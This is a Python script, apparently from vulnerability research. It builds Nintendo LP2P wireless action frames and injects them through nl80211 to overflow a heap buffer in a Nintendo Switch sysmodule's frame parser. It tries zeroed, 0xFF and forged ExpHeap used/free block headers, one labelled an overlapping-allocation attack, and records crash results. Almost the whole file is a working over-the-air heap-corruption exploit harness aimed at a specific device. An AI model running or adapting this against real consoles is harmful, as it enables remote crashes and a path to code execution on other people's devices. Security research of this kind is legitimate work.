#!/usr/bin/env python3
"""Test heap corruption via parser body copy overflow.

When body_size=0x800, the body copy writes 0x800 bytes to parser+0x5C.
The parser is only 0x5D8 bytes, so bytes body[0x57C:0x800] overflow into
the adjacent heap block header (0x284 bytes of controlled heap corruption).

This test sends frames with SAFE payload_size (no stack overflow) but
body_size=0x800 (heap overflow) with various patterns in the overflow
region to observe the effect.

If the adjacent block is a USED block, corrupting its header should crash
when the sysmodule tries to free it or use it.

If the adjacent block is FREE, corrupting the free list metadata should
crash on the next allocation or free.
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412

LP2P_HEADER = (
    b"\x7f"           # Category: Vendor Specific
    b"\x00\x22\xaa"   # Nintendo OUI
    b"\x04"           # Type
    b"\x01"           # Version
    b"\x01\x01"       # frame_type = ADVERTISE
    b"\x00\x00\x00\x00"  # reserved
)


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla) % 4:
        nla += b'\x00' * (4 - len(nla) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:8]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_heap_overflow_body(body_size, payload_size, overflow_fill):
    """Build type 3 body with controlled heap overflow.

    body_size: total body size (0x800 for maximum overflow)
    payload_size: safe value (e.g., 0x100) to avoid stack overflow
    overflow_fill: bytes to write into the heap overflow region (body[0x57C:body_size])
    """
    body = bytearray(body_size)
    # Type 3 header
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    # Safe payload_size
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, payload_size)
    # Fill the overflow region
    overflow_start = 0x57C  # parser+0x5D8 - parser+0x5C = body offset where next block header starts
    overflow_len = body_size - overflow_start
    fill = overflow_fill[:overflow_len] if len(overflow_fill) >= overflow_len else \
           overflow_fill * ((overflow_len // len(overflow_fill)) + 1)
    body[overflow_start:body_size] = fill[:overflow_len]
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def run_test(fam_id, ifindex, name, overflow_fill, frame_count=100, body_size=0x800):
    print(f"\n{'='*60}")
    print(f"  TEST: {name}")
    print(f"{'='*60}")

    if not check_alive():
        print("  Switch not reachable, waiting...")
        if not wait_alive(30):
            print("  SKIP: Switch not available")
            return None

    body = build_heap_overflow_body(body_size, 0x0100, overflow_fill)
    frame = build_frame(body)
    print(f"  Body: 0x{body_size:04x}, payload_size=0x0100 (safe)")
    print(f"  Overflow fill: {overflow_fill[:16].hex()}...")
    print(f"  Frames: {frame_count}")

    t0 = time.time()
    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            print(f"  Frame {i} failed: {err}")
            break
        time.sleep(0.002)

    t1 = time.time()
    inject_time = t1 - t0

    # Check if crashed during injection
    time.sleep(1)
    alive_mid = check_alive()
    ping_mid = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                               capture_output=True).returncode == 0

    # Wait longer and check again
    time.sleep(5)
    alive_post = check_alive()
    ping_post = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                                capture_output=True).returncode == 0

    if alive_post and ping_post:
        result = "NO_CRASH"
    elif ping_post and not alive_post:
        result = "HTTP_DOWN"
    elif not alive_mid and not ping_mid:
        result = "CRASH_FAST"
    else:
        result = "CRASH_DELAYED"

    print(f"  Mid-check: HTTP={'UP' if alive_mid else 'DOWN'} Ping={'OK' if ping_mid else 'FAIL'}")
    print(f"  Post-check: HTTP={'UP' if alive_post else 'DOWN'} Ping={'OK' if ping_post else 'FAIL'}")
    print(f"  Result: {result}")
    print(f"  Inject time: {inject_time:.1f}s")

    return {
        "name": name,
        "overflow_fill": overflow_fill[:32].hex(),
        "frame_count": frame_count,
        "result": result,
        "inject_time": inject_time,
        "mid_alive": alive_mid,
        "mid_ping": ping_mid,
        "post_alive": alive_post,
        "post_ping": ping_post,
    }


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE} (ifindex={ifindex})")
    print(f"nl80211 family: {fam_id}")

    results = []

    # Test 0: Baseline - no heap overflow (body_size=0x570, safe)
    r = run_test(fam_id, ifindex,
                 "BASELINE (no heap overflow, body_size=0x570)",
                 b"\x00" * 0x284,
                 frame_count=100,
                 body_size=0x570)
    if r: results.append(r)

    if not wait_alive(30):
        print("\nSwitch didn't recover, aborting")
        return

    # Test 1: All zeros in overflow region
    r = run_test(fam_id, ifindex,
                 "ALL_ZEROS (zeroed heap metadata)",
                 b"\x00" * 0x284)
    if r: results.append(r)

    if not wait_alive(30):
        print("Switch recovering...")
        time.sleep(15)
        wait_alive(30)

    # Test 2: All 0xFF (maximum corruption)
    r = run_test(fam_id, ifindex,
                 "ALL_FF (max corruption)",
                 b"\xff" * 0x284)
    if r: results.append(r)

    if not wait_alive(30):
        print("Switch recovering...")
        time.sleep(15)
        wait_alive(30)

    # Test 3: Fake "USED" block header (MU magic, valid-looking)
    # nn::lmem ExpHeap block header (from public RE):
    # +0x00: uint16 magic (0x4D55 = "MU" LE for used)
    # +0x02: uint16 attributes
    # +0x04: uint32 size (data size)
    # +0x08: void* prev_block
    # +0x10: void* next_block
    # Total header: 0x18 bytes
    fake_used = bytearray(0x284)
    struct.pack_into("<H", fake_used, 0x00, 0x4D55)  # magic "MU"
    struct.pack_into("<H", fake_used, 0x02, 0x0000)  # attributes
    struct.pack_into("<I", fake_used, 0x04, 0x1000)   # size: 4K
    # prev/next: null (safe)
    r = run_test(fam_id, ifindex,
                 "FAKE_USED (MU magic, 4K size, null ptrs)",
                 bytes(fake_used))
    if r: results.append(r)

    if not wait_alive(30):
        print("Switch recovering...")
        time.sleep(15)
        wait_alive(30)

    # Test 4: Fake "FREE" block header (FR magic)
    # This should trigger coalescing on parser free
    fake_free = bytearray(0x284)
    struct.pack_into("<H", fake_free, 0x00, 0x4652)  # magic "FR"
    struct.pack_into("<H", fake_free, 0x02, 0x0000)  # attributes
    struct.pack_into("<I", fake_free, 0x04, 0x0400)   # size: 1K
    # prev/next: null
    r = run_test(fam_id, ifindex,
                 "FAKE_FREE (FR magic, 1K size, null ptrs)",
                 bytes(fake_free))
    if r: results.append(r)

    if not wait_alive(30):
        print("Switch recovering...")
        time.sleep(15)
        wait_alive(30)

    # Test 5: Fake FREE with large size (overlapping allocation attack)
    fake_free_large = bytearray(0x284)
    struct.pack_into("<H", fake_free_large, 0x00, 0x4652)  # magic "FR"
    struct.pack_into("<H", fake_free_large, 0x02, 0x0000)
    struct.pack_into("<I", fake_free_large, 0x04, 0x10000)  # size: 64K
    r = run_test(fam_id, ifindex,
                 "FAKE_FREE_LARGE (FR magic, 64K size, null ptrs)",
                 bytes(fake_free_large))
    if r: results.append(r)

    if not wait_alive(30):
        print("Switch recovering...")
        time.sleep(15)
        wait_alive(30)

    # Test 6: Only corrupt first 2 bytes (magic only)
    # Keep the rest of the overflow region as zeros
    magic_only = bytearray(0x284)
    struct.pack_into("<H", magic_only, 0x00, 0xDEAD)  # invalid magic
    r = run_test(fam_id, ifindex,
                 "INVALID_MAGIC (0xDEAD, rest zeros)",
                 bytes(magic_only))
    if r: results.append(r)

    if not wait_alive(30):
        print("Switch recovering...")
        time.sleep(15)
        wait_alive(30)

    # Test 7: Smaller body sizes to narrow down where the overflow starts
    # body_size=0x5D8-0x5C = 0x57C → exact parser size, no overflow
    r = run_test(fam_id, ifindex,
                 "EXACT_FIT (body_size=0x638, no overflow)",
                 b"\x41" * 0x284,
                 body_size=0x638)  # 0x5D8 + 0x5C = 0x634, round up
    if r: results.append(r)

    # Print summary
    print(f"\n{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")
    for r in results:
        print(f"  {r['name']}: {r['result']}")

    # Save results
    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "heap_corrupt_test.json")
    with open(outfile, "w") as f:
        json.dump({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "results": results}, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
